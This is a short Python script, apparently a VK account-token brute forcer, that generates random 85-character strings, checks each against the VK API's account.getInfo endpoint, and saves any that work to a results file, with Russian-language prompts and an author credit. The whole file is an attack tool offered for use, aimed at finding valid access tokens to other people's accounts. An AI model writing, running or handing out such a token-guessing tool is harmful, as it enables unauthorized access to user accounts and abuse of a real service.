import requests
import random
import string 
import sys

def progress(val, end):
    
    percent = float(val) / end
    arrow = '-' * int(round(percent * 20)-1) +'>'
    spaces =' ' * (20 - len(arrow))
    
    sys.stdout.write("\rПроцесс: [{0}] {1}%".format(arrow + spaces, int(round(percent * 100))))
    sys.stdout.flush()


def check_valid(t):
    session = requests.session()
    
    token = t
    
    response =session.get('https://api.vk.com/method/account.getInfo', params={'access_token': token, 'v': '5.92',}).json()
    try:
        tmp = response['response']
        return True
    except:
        return False

print()

print("Author: 'Nico'")
print("VK: 'vk.com/nico_ll'")

print()

f = open('result/result.txt', 'w')

ok = 0   

k = input("Введите кол-во попыток: ")

for i in range(int(k)):
    GenerateTokin = (''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(85)))
    if check_valid(GenerateTokin) == True:
         f.write(GenerateTokin + '\n')
         ok = ok + 1
         
    progress(i, int(k)-1) 

print('/n')
print("Результат: " + str(ok) + " совпадений!")
f.close()
    
    